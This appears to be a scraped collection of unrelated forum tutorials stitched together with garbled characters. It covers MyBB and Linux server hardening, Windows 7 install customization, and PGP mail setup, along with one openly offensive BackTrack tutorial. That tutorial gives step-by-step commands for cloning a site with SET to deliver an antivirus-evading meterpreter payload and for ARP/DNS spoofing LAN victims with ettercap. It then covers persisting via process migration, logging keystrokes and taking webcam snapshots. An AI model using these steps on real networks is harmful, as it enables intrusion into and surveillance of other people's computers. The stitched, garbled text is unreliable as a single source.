user/pass is different  to the Admin password. Add an ip whitelist to the AdminCP You can use .htaccess to permit only those with a certain ip to access  the AdminCP, this is very secure! (Its not a very good idea to do this  if you have a dynamic IP though because you might find your self locked  out one day. Just put/add to a .htaccess file in the admincp root  containing the following.             Order Allow,Deny Allow from Your.static.ip.adress           Add a pin to the Admin Cp This  pretty much does the same thing as .htpasswd but can look a little  better. There are plenty of tutorials on this so just make a search. Remove the backup system from the AdminCp If  someone was to gain unauthorized access to the admin cp they could  easily dump all the SQL info using the built in backup feature. Its a  good idea to disable this if you are not going to use it. Simply go to           {root}/{admincpdir}/modules/tools/backupdp.php           And add a the following after the           <?php                     die(Backups Disabled);           If you want to use this module then simply comment out the addition and uncomment it when you are done. These are the key points. After this i will just put a few simple extra tips and some links for more info   Run MyBB with a database user that is not used with anything else on your website to prevent one failure leading to another Restrict the database user that MyBB uses to only be able to do what it needs and nothing more Restrict PHP to only be able to execute functions that are needed and nothing more Remove any features you dont need (dont use the portal?. then remove it, dont use the calendar? then disable it etc) Make sure you dont have scrutinize IP enabled unless you really, really, really know what you are doing Search through forums/exploit DBs for potential exploits often If you are starting a forum from scratch change how passwords are  salted and hashed for some extra obscurity in the event your DB is  leaked If youve left anything in Areas the public can access such as a plugin zip file or a phpinfo.php then be sure to remove. If something is suspicious... CHECK IT OUT!   """
0	Linux (Web)server security	""" Heres one of my tutorials on linux security. Its not FULLY finished  yet, and will get edited. But most of it is there already Have fun.   I wanted to post a few tips on how you can easily secure your network on a debian based distro,   All written by us and is a part of tutorials i post on ChaseNET, please dont copy this without asking!   In this tutorial we will be using CSF/LFD (IPtable integrated  firewalls), PSAD for anti portscans and DDoS-Deflate for protection  against (D)DoS attacks, for more security on your server. We will also  be using a webinterface on some places instead of console to make things  easier for beginners as well, for this i choosed webmin, as it is  intergrated into everything you can do on a linux system.     Before we start we would need to install apache/php and mysql on your  server as well, not going to much into that you can read about how to  easily do that on a debian based system HERE:   Code:   Hidden Content:  You must reply to see links   Please also try to use an updated debian system so we dont have any crash on dependencies. In some cases you might want to get the build-essential package as well   Code:   apt-get install build-essential  You will also have to get syslog-ng for logging.   Code:   apt-get install syslog-ng  First step: Installing webmin,   We start of with our web interface for easy management and set up of the firewall etc:   Code:   wget  Hidden Content:  You must reply to see links   Installing webmin with:   Code:   dpkg -i webmin_1.500_all.deb  If you get an error saying you dont have all the dependencies just run:   Code:   apt-get -f install  So after this has installed itself you can easily access your webinterface by going to this address:   Code:   Hidden Content:  You must reply to see links   If this now display a login page you have done it right.   Now we can start the fun part of setting up the firewall   Step two: Installing and configuring CSF firewall   Downloading CSF:   Code:   wget  Hidden Content:  You must reply to see links   Untar the package:   Code:   tar xvzf csf.tgz  Switch to the csf directory   Code:   cd csf  And just run the install script:   Code:   sh install.sh  If this completed without errors we can now load csf into webmin.   Loading the module: Log into your webmin interface and go to Webmin > Webmin Configuration > Webmin Modules. On local file you fill in the path to the webmin module installed by csf,   Code:   /etc/csf/csfwebmin.tgz  And press Install Module.   If this goes well you will now see \""ConfigServer Security & Firewall\"" Under the SYSTEM tab in webmin.     Step three: Configuring ConfigServer Security & Firewall   Go to the ConfigServer Security & Firewall tab in webmin and press \""Firewall Configuration\"" For this tutorial we will just fill out the easiest part of the  configuration but feel free to explore more of the big potentials of  CSF.   Change these areas of the config,   Stop running CSF in testmode:   Code:   TESTING=1 to TESTING=0  Set the open ports (here we will just fill in what we need at the moment)   Code:   TCP_IN=21,22,80,10000   21 for ftp, 22 for ssh, 80 for the www and 10000 for webmin (the last one here is very important to remember)   Code:   TCP_OUT=21,22,80,10000  Changing  ICMP requests (optional) This will disable ping requests and answers. I  personaly like to set this to off, so no specific ping attacks can be  made with special packets.   Code:   ICMP_IN=0   Code:   ICMP_OUT=0  Protection against synflood (for webservers etc)   Code:   SYNFLOOD=1  Protection against portfloods   Code:   PORTFLOOD=1  That should be all, scroll down to the end and press CHANGE to save all the changes you have made to the config.   The usage of CSF will be explained in another tutorial later on, but the  interface is very easy to understand. \""View iptable logs\"" To see what  csf have banned and why, \""View LFD logs\"" to see what it has picked up as  suspicious processes, who has logged in through ssh and if any  portscans have been detected.     Step four: Installing PSAD   As mentioned before, you would need to have syslog-ng installed before running psad properly, with this done, lets start!   Download and install psad:   Code:   apt-get install psad  Setup syslog-ng to log things from PSAD (You dont need to use nano if you like other editing tools better.   Code:   nano /etc/syslog-ng/syslog-ng.conf  Search for the \""# pipes\"" Section and add this to the list:   Code:   destination psadpipe { pipe(\""/var/lib/psad/psadfifo\""); };  Search for the \""# filters\"" section of the config and add this line   Code:   filter f_kerninfo { facility(kern); };  And all the way on the bottom of the config, add these lines:   Code:   log {         source(s_all);         filter(f_kerninfo);         destination(psadpipe); };  Restart syslog-ng:   Code:   /etc/init.d/syslog-ng restart  Now we have the logging in place, and we can start configure psad:   Code:   nano /etc/psad/psad.conf  The most important parts will be these, fill them in with your own information: Your email address   Code:   EMAIL_ADDRESSES  Your Hostname (like  Hidden Content:  You must reply to see links )   Code:   HOSTNAME  Set home_net to not used:   Code:   HOME_NET                NOT_USED;  ### only one interface on box  If you want to set ports to ignore on scans you can do it like this (optional):   Code:   IGNORE_PORTS                tcp/88, udp/3000;  For IDS and iptable support:   Code:   ENABLE_AUTO_IDS             Y; IPTABLES_BLOCK_METHOD       Y;  Now save and close the config. Restart PSAD:   Code:   /etc/init.d/psad restart  Now all we need is to add two iptable rules so psad can use iptable logging, done with these two commands:   Code:   iptables -A INPUT -j LOG iptables -A FORWARD -j LOG  That was all for PSAD, it should now be up and running and scan reports can be made using this command:   Code:   psad -S  Step five: Anti-DDoS Setting up DDoS-Deflate is easier than you think, with just a few commands and changes, Downloading and installing DDoS-Deflate:   Code:   wget  Hidden Content:  You must reply to see links  chmod 0700 install.sh ./install.sh  To configure ddos deflate you will need to do a few small changes: Open up the script in your favourite editor,   Code:   nano /usr/local/ddos/ddos.sh  Scroll down to add_to_cron() and you will find 2x of these lines   Code:   service crond restart  Change it to:   Code:   service cron restart  Save and close the script and open up the ddos.conf:   Code:   nano /usr/local/ddos/ddos.conf  Here you can change how ddos should react in different situations and you can put your own config on these lines,   How often the script is going to run (minutes):   Code:   FREQ=1  Number of connections a user will need to have at the same time before he gets banned by the script:   Code:   NO_OF_CONNECTIONS=30  Set this to 0 to use IPtables since we dont use APF:   Code:   APF_BAN=0  Kill connections or not:   Code:   KILL=1  If you want emails of the banned IPs then set your email inside the \""\"":   Code:   EMAIL_TO=\""\""  Now save and close the config and run this command to add the script to crontab so it runs every minute:   Code:   /usr/local/ddos/ddos.sh --cron  A few extra things you might want to add to your linux servers for extra functionality against (D)DoS attacks: Enable SYN_Cookies:   Code:   sysctl -w net.ipv4.tcp_syncookies=1  Increase the Connection backlog, allowing more connections   Code:   sysctl -w net.ipv4.tcp_max_syn_backlog=2048  If  you want to make it permanent just add them to the sysctl config in the  /etc/sysctl dir so it will stay like that even after reboots.     And thats everything you need to set up a bit more security on your  linux box, even if its at home or on your server. Feel free to read  around on the different documentation (provided by a google search) and  implement more secure solutions and take use of all the other nice  features these tools have.

0	[TUT] BACKTRACK 5r2, Infecting People on your LAN without sending any files! [TUT]	"""   WHAT IS BACKTRACK? This  tutorial is an older one of mine. I decided to bring it back in the new  backtrack subforum. NOTE: This works exactly the same as on backtrack  5r3. For those of you who dont know, backtrack is a huge compilation of hacking tools that you can use for various things including - Sniffing password - Hacking your entire LAN - Infecting someone on LAN by redirecting there browser searches to your maching - Taking control of computers on your LAN - AND SO MUCH MORE! In this tutorial, I am going to explain -How to install backtrack -Where/how to run it -Show you some of my personal favourite tools and how to use them effectively! First of all you must decide if you want to run backtrack on a USB flash  drive, a Virtual Machine, or your own computer. For those of you who  dont know what these are: A Virtual Machine is basically a program that takes a part of your  computer and separates it from the rest of your computer so that you can  run/test viruses, RATS or in this case, Backtrack from the separated  part so that the virus doesnt take over your whole computer or in this  case, so you can keep your nice graphical OS (Operating system). A USB flash drive is a seperate, portable hard drive that you plug into  your computer. In this case, the USB will act as a Virtual Machine so  that you can run backtrack separated from your OS.  Lastly (and this I highly recommend you dont do) is to run Backtrack on your own computer. HOW TO INSTALL BACKTRACK ON A VIRTUAL MACHINE (VM) I recommend this method of running backtrack because it is the most  convenient and you dont have to go out and buy a USB stick. Also, if  you use a USB stick and someone has to borrow it, the files can look a  bit sketchy so its best to do it this way in my opinion. STEP 1 Download backtrack from  Hidden Content:  You must reply to see links  and save it to your desktop. (Note, this file is HUGE, so be patient. It can take a few hours to download it so go do something else while you wait) Download VirtualBox (a free virtual machine) from  Hidden Content:  You must reply to see links   (Note, this file is also quite big but not as big as backtrack) STEP 2 Run VirtualBox and install it. Im not going to walk you through that  because the install of virtualbox is pretty self-explanatory STEP 3 Start virtualbox, go to the top left corner and click the icon that says: NEW and click next. STEP 4 Type in a name. I use the name - Backtrack 5r2 (or 5r3 if you downloaded that one). Select the operating system - Linux Ubuntu. IMPORTANT - If you downloaded the 64 bit version of Backtrack, you must  use Linux Ubuntu 64 bit. If you downloaded the 32 bit version, leave it  as Linux Ubuntu.  Click Next STEP 5 Select the amount of RAM you want your VM to use. I would use as much as  you are willing to give to the VM because many of the hacking programs  in backtrack use lots of RAM or else they go really slow. Click next Click: Create a new hard disk and click next Leave it as the top one (VDI) Click next STEP 6 Select dynamically allocated and click next Select how much storage you want on this VM. I use 16 GB just to be safe  but I dont think that you need that much. 12 GB is the minimum if you  want a safe, stable install Click create until you are out of both windows STEP 7 A \""machine\"" should appear on the left hand side of the VirtualBox Window  with your title. Click it, go to the top menu and click start. You should get a black window and a window that says, welcome to the First Run Wizard. Click Next Now it should say, select Installation Media. Hit the scroll bar and the  name of the backtrack file you downloaded should be there. Select that  and click next then click create. Now a black window with white text should appear. Wait until it brings you to the red window titled, Backtrack live cd STEP 8 Choose the first one (text version). It should bring you to another red  window that says backtrack at the top. You should see a black window  that is loading stuff. When it is done, type in  startx . This will bring you to the GUI of backtrack. I recommend using startx  every time you start backtrack because the GUI is much more organized,  nicer to look at and simpler to understand. Anyways, there should be a little icon that says install backtrack. Double Click on that. From there, you can basically click next until youre out of there  unless you see something that you dont like. After that, you will see a  window that says copying files. This will take a long time so be  patient.  IMPORTANT - DONT PANIC IF IT GETS STUCK AT A CERTAIN PERCENT. IT DOES THAT TO EVERYONE! JUST BE PATIENT AND WAIT! After that, turn off the machine and then turn it on again.  Go into settings (right beside the start button) and click network (on  the left side). Select - Attached to : Bridged Adapter. Select the  router that is the name of your router. This time after it loads, itll flash to the backtrack wallpaper for a  while then back to the loading black window. This time (and from now on)  you will have to enter a username and password to get into backtrack. Username = root Password = toor When you type in the password, no text will show up even if you are typing. This is normal. After that is done, once again use startx to go to the GUI (graphical  user interface...basically a nicer looking version of the program). CONGRATULATIONS, YOU HAVE SUCCESSFULLY INSTALLED BACKTRACK! If you would like to learn how to use some of my personal favourite tools of this magnificent program, read on. My favourite program by far is SET (which stands for social engineering  toolkit). Its super easy to use, and gives magnificent results. There are multiple methods of using SET. The one I will explain to you  is my favourite. Basically it will copy a website and make it so that  when anyone on your network visits this website, they will go to your  website instead with the virus on it! If you use this method, its best  to use sites like facebook or other ones that people frequently use. OK on with the tutorial. In this method, we will be using: - A terminal - The Social Engineering Toolkit (SET) First start SET by going to the top right of the backtrack window onto  the \""Applications button\"", from there click \""Exploitation Tools\"", then  \""Social Engineering\"" and then click \""set\"". If there are two, click the  top one. Then we will type in 2 (Website Attack Vectors) Please note that like I said SET is probably the easiest to use tool on  backtrack. From this menu, you can experiment. I will explain some of  the options here. -Java Applet Attack - Clones a site then when someone visits the site,  it prompts them to run a java file. Then it will infect the victims  computer and you will be able to control it -Metasploit Browser Exploit - This will use metasploit (my second  favourite tool on backtrack) to create a server. When the victims  computer connects to the server (by typing in your ip), they will be  infected and you will be able to take control of their computer. This  one is only ok because you have to somehow convince the victim to type  in your ip in the address bar. Ex.  Hidden Content:  You must reply to see links :8080 -Credential Harvester Attack - This is probably the best one to use if  you just want to get their facebook/gmail/whatever passwords. Basically  itll clone a site login page. When people visit it (by typing in your  ip address) they will see the login page and probably try to log in.  Backtrack will copy what they typed in (their username and password) and  send it back to you. I will not explain the other ones as they are more complicated and not suited for a tut that was made for newbs. Then we will wait for it to load. Once it loads it will bring up a menu  with a bunch of options. We will type in \""1\"" without the brackets Then we will type in \""1\"" (The Java Applet Attack Method).  It will then display some options. We will use number 2 (site cloner) Type in the required information that it prompts you to enter. When it asks which site you would like to clone, type in a site that you think your victims use a lot. Ex.  Hidden Content:  You must reply to see links When it asks to enter in your ip for the reverse connection, open up a  terminal (on the main page of backtrack at the top, has a little picture  of a black window) and type in  Code: ifconfig  Look for your internet address. It should say something like 192.168.1.xxx. If it says something random like  Hidden Content:  You must reply to see links ,  it means that you are not connected to the internet properly and you  should go back into the settings and try connecting to a different  router. When it asks if you use nat/portforwarding enter in no or n. When it asks what port to run it on type in a random port. I use port 4444. When it asks what payload to generate, use number 14 because it is AV safe (Anti-virus undetectable) When it asks what type of meterpreter session to use (there will be 3 options) type in number 1 When all that is done, press enter and it will start doing its thing. Meanwhile, we will open up a terminal and type in:  Code: gedit /usr/local/share/ettercap/etter.dns   This will open up a file with a bunch of weird text on it. Scroll down to the part near the top where it says \""Microsoft Sucks\"" You will see a part of it that says something like this \""microsoft.com A  Hidden Content:  You must reply to see links *.microsoft.com A  Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links  PTR  Hidden Content:  You must reply to see links we need to change the microsoft.coms to the website that the victim  will be visiting (Ex. Facebook) and we need to change the ip addresses  to the ip address that we got when we entered ifconfig. Here is an example \""facebook.com A  Hidden Content:  You must reply to see links *.facebook.com A   Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links  PTR  Hidden Content:  You must reply to see links This step is ESSENTIAL for any of this to work! We will save the file by clicking the button at the top that says save,  then we will close the window. We will then open up a new terminal and  enter in  Code: ettercap -Tqi eth0 -P dns_spoof -M ARP // //  Be sure to include all of the capitals and spaces. If this doesnt work, then your wireless interface is different than mine. Try this ONLY if the one above didnt work  Code: ettercap -Tqi wlan0 -P dns_spoof -M ARP // //   Press enter and wait until it starts generating a list of ips. Go back to our SET terminal and see if it is done. It is done when it  starts making a list of gibberish and says starting the payload handler. Minimize all of this then go to  Hidden Content:  You must reply to see links   on your normal computer (or whatever site you used). (We are doing this  to test if it works, this will work on any computer in your network)  You should be prompted to run a java plugin. Run it this time and click  run on the popup window. Then return to the SET terminal. It should have started spouting a bunch of crap. Wait until it says,  finished migrating or something along those lines. This means that you  have successfully infected the victims computer. To interact with the victims computer first type in  Code: sessions -l  (That is an \""L\"" by the way) This will list the sessions that we have on  the victims computer. If there are more than one, thats good. If there  is only one, that is also fine. The more the better! Type in  Code: sessions -i 1  This will interact with the first session. You can substitute the 1 with  another number if you want to interact with another sessions BOOM! We now have control over the victims computer Google meterpreter commands to see what you can do once at this stage. To ensure that the victim stays infected, we are going to migrate our  server to the explorer.exe task on the victims computer. This way, they  can only get us out if they restart their computer or something. To do this first type in   Code: ps  This will display all of the processes on the victims computer. You  need to browse through all of that until you locate explorer.exe  Look  for the number beside it (it should be in the thousands) and remember  it. Go back down and type in  Code: migrate numberthatyouremembered  Ex. migrate 3968 Wait until it says migration completed successfully You may now use commands for the meterpreter 3 useful commands are keyscan_start (starts a keylogger) keyscan_dump (shows you what they have typed) webcam_snap (takes a picture with the webcam and saves it to the computer) getuid (Shows you the name of the computer and the name of the user) THIS IS JUST THE TIP OF THE ICEBERG!

It comes with a whole host of programs, features, and services that, best case, take up unnecessary space, or worst case, slow down your machine. If youd rather have a slimmer installation of Windows, you can create your own Windows installer with  RT Se7en Lite Ã¢â¬âcomplete with tons of other customizations so you can turn Windows into your dream OS. Heres how to do it. RT Se7en Lite (yes, the name is insane) is a configuration tool that lets you edit your Windows install disc. You can remove Windows features you dont want, add drivers you know youll need, add or remove items from the Control Panel and right-click menu, and lots more. You can even create a disc that includes Service Pack 1 (through a process called \""slipstreaming\"") so you dont have to sit through hours of Windows updates every time you install Windows on a new machine. The tool is remarkably easy to use, and even with heavy tweaking, it does a good job of making sure you dont remove anything thats going to screw up your system. What Youll Get The process may seem a tad long and arduous, but the final product is well worth the work. You can use RT Se7en Lite to customize Windows 7 in a ton of ways. For example, you could: Cut your install time in half by slipstreaming Service Pack 1 and adding all your favorite apps to your install disc, so you dont have to sit there installing things each time you put Windows on a new computer. Create a minimalist version of Windows, which cuts out all the unnecessary apps and services and makes your computer run fasterÃ¢â¬âperfect for old or low-powered hardware. Save space by removing apps and services you dont need, not to mention remove the things that annoy you (like those annoying games or the \""Welcome to Windows\"" app you really dont need). Make all your favorite system tweaks and registry hacks before you install Windows, so you dont have to make them later onÃ¢â¬âa clean installation of Windows becomes your perfect installation of Windows. Add drivers to your install disc so you dont have to go rummaging for them later on. This is especially great for ethernet and wi-fi drivers, which would require you to find and insert your manufacturers disc to install them (since, if you dont have ethernet or wi-fi drivers, you paradoxically cant access the internet to download their drivers). When youre done with RT Se7en Lite, youll have your own, custom Windows disc containing all your favorite settings, speed-boosting tweaks, and favorite apps, ready to install on any machineÃ¢â¬âessentially, youll have the Windows you always wished you had. Its especially great if you install Windows on multiple machines, or reinstall it regularly. You only have to make these tweaks once, and theyll be added every time you do a fresh install. Heres how to use RT Se7en Lite. Step One: Fire Up RT Se7en Lite First, download RT Se7en Lite from its home page and install it on your machine. Make sure you download the latest version, which is strangely at the bottom of the download page instead of the top (version 2.6.0 at the time of this writing). Before you run it, youll want to make sure you have a Windows installation ISO handy (an ISO is a disc imageÃ¢â¬âbasically its the Windows install disc ripped to a file on your computer). If you dont have an ISO but you do have a physical Windows installation disc, you can create an ISO from that disc using something like  ISO Recorder . Youll also want to  download Service Pack 1  if you plan on slipstreaming SP1 into your custom installation CD (which you probably want to do!). RT Se7en Lite will need to extract the discs files somewhere before it edits them, so before you start, create a temporary folder on your desktop called \""7lite temp\"" or something like that. You can delete this folder when youve finished. To get started, start up RT Se7en Lite. You can go ahead and close the advertisement that pops up with the program. When the main page appears: Click the Browse button on the main page, and locate your Windows 7 ISO.. Point it to your temporary folder as the extract path and click OK. When it asks you which image to configure, choose the version of Windows that corresponds to your discÃ¢â¬âe.g., Windows 7 Home Premium or Windows 7 Professional. If you want to slipstream Service Pack 1 into your disc, make sure you check the \""Slipstream Service Pack\"" box at this step. After you click OK, youll get a new window that lets you browse to the service pack you downloaded earlier, after which you can click Start to start the slipstreaming process (if you arent slipstreaming, skip this step). Itll take a few minutes to slipstream, so just let it do its thing. If the slipstream was successful, it will continue to extract your disc image, which again, can take a few minutes. When its ready, itll say \""Loading Completed\"", and you can get to tweaking. Step Two: Time to Tweak Click the Task button in the left sidebar. From here, you can choose which portions of Windows you want to customize. You have six checkboxes on this page, which correspond to the six sections on the left sidebar of the app. They include: Integrate: Here, you can add Windows security updates, hotfixes, language packs, drivers, and other 3rd party applications to your Windows installation disc. Components Removal: This section lets you remove applications and other features from Windows to make it more lightweight. Tweaks: The Tweaks menu allows you to change advanced settings for things like the Desktop, Windows Explorer, and more, as well as add and remove shortcuts from the Control Panel. You can also add your own registry tweaks. Un-Attended: If you want to skip user creation, enter your product key, and tweak other regional settings, you can set them here and bypass them during the Windows installation process. Customization: In this section, you can add your own screensavers, icons, wallpapers, themes, and other visual tweaks, as well as change Windows logon screen background. Bootable USB or DVD: After youve made all your tweaks, this section lets you create an ISO which youc an then burn to USB or DVD for installation. Check this now, but we wont deal with it until step three. Check the boxes of the sections you want to use, and then click on each one individually in the right sidebar, making whatever tweaks you want. Heres a more detailed look at what youll find in each section. Note that when you make your tweaks, youll need to click the Apply button on each page, which will open up the Log section and let you know which tweaks youre applying. Integration The Integration section has four tabs: Updates, Drivers, Language Packs, and Applications. If there are certain updates you absolutely need included in the original installation, you can do that here. I usually just slipstream the service pack and then download the rest of my updates through Windows Update. I also leave the Drivers section alone, though it could be really handy if your ethernet or wi-fi driver isnt included with WindowsÃ¢â¬âthat way you dont have to insert your manufacturers disc to install it. Applications is definitely the most useful part of this section. Here, you can add installer packages for all your favorite apps (that is, the MSI or EXE files you download from their home pages), and itll install them in one fell swoop along with Windows. Its almost like creating your own custom  Ninite package , using whatever apps you want. Here, Ill usually add my essential apps, like Firefox, Pidgin, and Winamp. Note that youll need to use the silent versions of these installers, which bypasses the installer menus. To do this, look up the silent command line switch for each program you want to install, and put it in the Silent Switch setting of RT Se7en Lite when prompted. Feature Removal Heres where the really fun stuff happens. Under Feature Removal, you can disable or remove certain features and applications that come with Windows. The left box lets you check boxes to permanently remove apps, while the right box lets you uncheck boxes to merely disable certain features. I usually go for the gusto and start checking things to remove in the left box, like Games, Language Packs, accessibility options, and anything having to do with a projector. The Services section is definitely the heftiest here, since removing certain services can free up some nice resources, but make sure you look closely at everything you removeÃ¢â¬âyou dont want to get rid of anything youll need later on. To find out what a certain Windows feature does before checking its box, just click on its name. RT Se7en Lite will provide a description of the feature or service, as well as any warnings you may want to keep in mind when removing it. Entries in red are things you dont want to remove, since Windows requires them to work properly. For a good guide on which services you can disable, check out  Black Vipers Windows 7 Service Pack 1 Configurations . However, I recommend leaving the Services portion alone, since you can disable services in the Tweaks section as described below. RT Se7en Lite even has Black Vipers recommendations built-in, so you can do it with two clicks, and not worry about permanently removing services youll want later. Tweaks The Tweaks section contains 10 different tabs, all of which contain different types of changes you can make to your system. Heres a quick rundown of what youll find under each tab. Control Panel: Here, you can remove shortcuts from the Control Panel, as well as add a few other useful ones, like a shortcut to the Registry, Group Policy Editor, and more. Desktop: This tab tweaks specific parts of the Windows desktop and taskbar, such as changing how fast menus open and close, what the taskbar buttons look like, and what the Shut Down button does in the Start menu. Explorer: This section deals with adding and removing shortcuts to My Computer, the context menu, and tweaking Explorers display view. There are a lot of shortcuts enabled here in the Context Menu section, so youll want to make sure you disable the ones you dont want or youll end up with a very long context menu, even on a clean installation of Windows! Security: This merely lets you enable or disable anti-spyware protection, User Account Control, or the Windows firewall. Services: Heres where you can do a lot of bloat cutting. As described above, the best way to deal with Services is to choose a Black Viper preset from the dropdown menu under the Services window. The Default setting shows you what Windows does by default, while the Safe, Tweaked, and Barebones settings each contained different numbers of disabled services, increasing in intensity. Again, be sure to check through the list and make sure your preset of choice doesnt disable something youll need down the line (though you can always re-enable them later on). Id recommend Safe, as Tweaked disables some features that a lot of people use, and Barebones disables quite a few security settings. The best thing you can do is choose the Safe preset, and then go through the services on this page in detail to see if theres anything you need (or dont). Chances are, even if you use the Safe setting, there are things youll want to re-enable (like Windows Search indexing, which is disabled under all of Black Vipers presets). Settings: These are little advanced settings that deal with things like the system prefetcher, hibernation, how many recent items to display in jump lists, and more. Visual Effects: Here, you can tweak certain effects related to Windows Aero. You can do anything from disabling transparent glass to turning off Aero Snap and Aero Shake. Internet Explorer: If you use Internet Explorer, you can edit some nice hidden settings here, like showing the full URL, turning off the search box, and more. Media Center: This lets you disable the background animation, sound effects, on screen keyboard, and more in Windows Media Center. Custom Registry: If you have any other registry tweaks you like to make to Windows (like one of these 10 beauties), you can put them into REG files and add them here. Theyll be applied automatically when you install Windows. Make sure you comb every inch of these tabs. Many tweaks are applied by default, and may confuse you when you first install your new version of Windows (for example, the taskbar is set to use small icons and combine only when the taskbar is fullÃ¢â¬âso it looks like the Vista taskbar). You can always change these tweaks after installing, so its not a horrible thing if one or two slip by youÃ¢â¬âbut the more you fix now, the less youll have to fix after installing Windows. Un-Attended The coolest part of this section is the area in which you enter your product key, so it automatically activates you after you install WindowsÃ¢â¬âperfect if youre one of those people that reinstalls regularly. You can also choose to skip user creation, enter OEM information, and change other regional settings here (like keyboard layout, time zone, and language). Customization Lastly, if you want to include certain screensavers, themes, wallpapers, gadgets, documents, sounds, and other tweaks with your installation, you can add them under Customization. This way, you dont have to re-add those things manually after you install. Theyll all be there as soon as you fire up Windows for the first time. You can also change the logon screen background in this section, as well as make a few other tweaks to things like the Start menu. Step Three: Create and Burn Your Disc Image Once youre done with all your tweaks, go to the Log section and click the Commit button. Itll make all your changes in the temporary folder you created on the desktop. This could take up to an hour or more, depending on how much youve tweaked. If you want to, you can also click the Export Settings button before you do so, which will save the tweaks you made in case you want to come back and edit them later. hen its done, head to the ISO-Bootable section to create your disc. Under Mode, you can choose Direct Burn, which will burn you a disc; Create Image, which will make you an ISO; or USB Bootable, which will create a bootable thumb drive. Give the volume a name, and tweak your burn settings, if applicable. Click the Make ISO button in the bottom left-hand corner and let Ã¢â¬Ëer burn. When its done, youre ready to install your custom version of Windows. Step Four: Install Windows and Check Over Your Changes The last step should be very familiar to you. Install Windows as you normally would, booting from your install disc, going through the steps, and letting your computer reboot numerous times. You may want to do this in a virtual machine first, to make sure everything works before you erase your current version of Windows. When its done, youll have a new, customized version of Windows at your fingertips. At this point, Id run through and make sure all your changes were applied correctly, and see if there are any things you need to fix. Again, you can fix a lot of these things now without a problem, but if you want to remake your disc with the correct changes, youll have to go back to RT Se7en Lite and repeat the process (this is why backing up your settings is a good idea). Got any favorite Windows tips, tweaks, or apps that you think are a must-have in an RT Se7en Lite customization session? Share them with us in the comments below. """

0	Configure Enigmail for Thunderbird (PGP Mail Encryption)	""" Today we publish a very complete tutorial about how to  use PGP mail encryption for mails between your friends, colleagues, etc.  and we will be using MozillaÃ¢â¬â¢s mail client Thunderbird. Thunderbird is a  very efficient mail client, which is also open source, so it has a  large community behind it to keep this nice piece of software safe,  secure and often updated.  Also because the FireFox web browser is part of the same family, it  offers a wide collection of add-ons Ã¢â¬â called Plugins Ã¢â¬â to make your  mailing experience continiously better. If you still donÃ¢â¬â¢t use  Thunderbird, we recommend you to get it now from its official website by  clicking on the button link below.     Hidden Content:  You must reply to see links    Note that Thunderbird is recommended by  Hidden Content:  You must reply to see links  website, a website dedicated by the  Hidden Content:  You must reply to see links company, the company which is behind the famous onion proxy service  Tor.    [h=3]Why is it necessary to encrypt mails nowadays ?[/h] This question has many possible answers. One of the most important  would be Ã¢â¬Ëyour privacyÃ¢â¬â¢. Suppose you work at a company you are  continuously sending and receiving mails that contain sensitive  information. But you do not really understand how the mail protocol  works. In most cases your mails will be handled your company mail server  and that is serviced by your System/Network Administrators. Did you  know that they are able to read all your mails? Do you realize that if  someone else is reading your mails they could create serious problems if  details of your company, of the policies or strategies of your company  or even your personal life would become public or be sold to a  competitor.  This happened to others and it could happen to you if the people who  manage the mail servers are evil but also if they are stupid. Everybody  should use IMAP with TLS to grab new mails securely, much like when you  should visite a website using HTTPS. For instance: if you connect to a  public WIFI-spot or in a private WIFI-spot with a weak security, anybody  could grab Ã¢â¬â via packet sniffing Ã¢â¬â your mail contents and read them  without you noticing.  Another reason to encrypt your mails would be: if someone steals your  laptop, he could easily break into your mail client and read all your  mails. He could even send incriminating mails to your clients or  colleagues.  PGP will also giving proof of your identity to your pen-friend.  Finally, as you already know after the last monthÃ¢â¬â¢s stories about  PRISM, government secret services can get their hands on your mails  without any problem. These governments will try to convince you that all  they do is within the law and is only done to catch spies or terrorists  but that is not really the problem. The problem is that someone is  reading your mails and that is invading your sense of privacy. ThatÃ¢â¬â¢s  why you should be protecting and securing your mail, because you donÃ¢â¬â¢t  want a complete stranger to read your personal communication.   [/HR] When correctly configured, PGP is the perfect solution to protect  yourself against such issues. It will encrypt (transform readable data  to unreadable version) your mails using a strong encryption method and  in addition will proof your identity using signed message function.   [/HR] [h=3][/h] [h=3]Prerequisite[/h]  Thunderbird mail client installed (Refer to the top of this tutorial for the download link) At least one mail address configured with Thunderbird  ThatÃ¢â¬â¢s all to begin with. In our example we have created some temporary mail-addresses  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */  which represents you and  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */  which represents your partner.   To use PGP mail encryption both you and your partner must configure the mail client to use PGP encryption!   Hidden Content:  You must reply to see links  [h=3]Install Enigmail[/h] The first thing you need to do is to install the add-on which will  integrate into Thunderbird the ability to use PGP encryption in your  mails. This add-on is by far the most complete available and also the most  respected, it has a lot of features and detects automatically when a  mail is encrypted. It asks you to enter your pass-phrase to decrypt the  mail content.  Go to option menu (depending of your Thunderbird version). It could  be to the upper left corner or right (for latest versions). Then click  on  Add-ons  menu.   Hidden Content:  You must reply to see links  Then in the Add-ons window: search for  enigmail   Hidden Content:  You must reply to see links  You should find plenty of add-ons corresponding to this search (which  are all related to PGP encryption), only Enigmail (our favorite one)  will will be of interest.   Hidden Content:  You must reply to see links  Click  Install  button, then restart Thunderbird to apply Add-on configuration.   Hidden Content:  You must reply to see links Normally  a new menu should appear in the option menu for Enigmail configuration.  We will explain the utility of this menu soon in this tutorial.  [h=3]Install GPG4Win (GnuPG free libraries for using PGP)[/h] Now we must install the PGP libraries for Windows (Note that if you  donÃ¢â¬â¢t use Windows, you 